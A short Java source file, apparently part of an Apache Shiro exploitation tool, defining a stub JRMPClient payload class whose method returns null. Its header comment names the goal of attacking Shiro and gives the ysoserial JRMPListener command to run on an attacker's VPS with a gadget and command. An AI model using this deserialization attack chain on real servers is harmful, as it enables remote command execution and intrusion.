package core.payload;


/**
 * Attack Shiro by JRMPClient
 * Open your JRMPSever in you VPS
 * java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener {port} {gadget} {command}
 */
public class JRMPClient implements ObjectPayload {
    @Override
    public Object getObjectPayload(String command) {
        return null;
    }
}
